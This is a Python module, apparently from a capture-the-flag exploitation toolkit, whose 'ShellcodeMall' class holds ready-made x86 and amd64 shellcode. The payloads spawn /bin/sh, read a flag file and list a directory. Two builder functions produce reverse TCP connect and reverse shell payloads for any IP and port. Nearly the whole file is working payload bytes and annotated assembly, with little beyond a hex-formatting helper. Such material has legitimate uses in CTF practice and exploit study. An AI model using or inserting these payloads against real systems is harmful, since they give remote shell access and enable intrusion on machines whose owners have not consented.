#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    : shellcode.py
@Time    : 2021/11/23 23:44:54
@Author  : Roderick Chan
@Email   : ch22166@163.com
@Desc    : Sell convenient shellcodes
'''

__all__ = [
    "ShellcodeMall",
    "shellcode2unicode"
]

class ShellcodeMall:
    class amd64:
        __all_execve_bin_sh = {
            27: "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
            29: "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
            }
        execve_bin_sh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
        cat_flag = "\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
        ls_current_dir = "\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"

        @staticmethod
        def reverse_tcp_connect(ip: str, port: int) -> bytes:
            # from http://shell-storm.org/shellcode/files/shellcode-907.php
            """
            /* socket(AF_INET, SOCK_STREAM, 0) */
            socket:
                push 0x41
                pop rax
                cdq
                push 2
                pop rdi
                push 1
                pop rsi
                syscall

            /* connect(s, addr, len(addr))  */
            connect:
                xchg eax, edi
                mov al, 42
                mov rcx, 0x0100007f5c110002 /*127.0.0.1:4444 --> 0x7f000001:0x115c*/
                push rcx
                push rsp
                pop rsi
                mov dl, 16
                syscall
            """
            int_ip = 0
            for i in ip.strip().split("."):
                int_ip <<= 8
                int_ip |= int(i)
            res = b"\x6a\x2a\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00"+ \
                    port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + b"\x51\x54\x5e\xb2\x10\x0f\x05"
            return res
        
        @staticmethod
        def reverse_tcp_shell(ip: str, port: int) -> bytes:
            # from http://shell-storm.org/shellcode/files/shellcode-907.php
            """
            /* socket(AF_INET, SOCK_STREAM, 0) */
            socket:
                push 0x41
                pop rax
                cdq
                push 2
                pop rdi
                push 1
                pop rsi
                syscall

            /* connect(s, addr, len(addr))  */
            connect:
                xchg eax, edi
                mov al, 42
                mov rcx, 0x0100007f5c110002 /*127.0.0.1:4444 --> 0x7f000001:0x115c*/
                push rcx
                push rsp
                pop rsi
                mov dl, 16
                syscall
            dup2:
                push 3
                pop rsi
            dup2_loop:
                mov al, 33
                dec esi
                syscall
                jnz dup2_loop
            execve:
                cdq
                mov al, 59
                push rdx
                mov rcx, 0x68732f6e69622f
                push rcx
                push rsp
                pop rdi
                syscall
            """
            int_ip = 0
            for i in ip.strip().split("."):
                int_ip <<= 8
                int_ip |= int(i)
            return b"\x6a\x41\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" + \
            port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + \
            b"\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x54\x5f\x0f\x05"


    class i386:
        __all_execve_bin_sh = {
            21: "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80",
            23: "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
            28: "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80",
            33: "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80",
            49: "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
        }
        execve_bin_sh = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
        cat_flag = "\x6a\x67\x68\x2f\x66\x6c\x61\x89\xe3\x31\xc9\x31\xd2\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80"
        ls_current_dir = "\x68\x01\x01\x01\x01\x81\x34\x24\x2f\x2e\x01\x01\x89\xe3\xb9\xff\xff\xfe\xff\xf7\xd1\x31\xd2\x6a\x05\x58\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb6\x02\x31\xc0\xb0\x8d\xcd\x80\x6a\x01\x5b\x89\xe1\x31\xd2\xb6\x02\x6a\x04\x58\xcd\x80"


def shellcode2unicode(shellcode: str or bytes) -> str:
    """Switch a shellcode to unicode-form, like: 'a' --> '\\x61'

    Args:
        shellcode (str, bytes): shellcode.

    Returns:
        str: string with '\\x'.
    
    Example:
        >>> s = shellcode2unicode('abcd')
        >>> print(s)
        \\x61\\x62\\x63\\x64
    """
    assert isinstance(shellcode, (str, bytes))
    if isinstance(shellcode, str):
        shellcode = shellcode.encode()
    shellcode = shellcode.hex()
    res = ""
    for i in range(0, len(shellcode), 2):
        res += "\\x{}".format(shellcode[i:i+2])
    return res


if __name__ == '__main__':
    import doctest
    doctest.testmod()
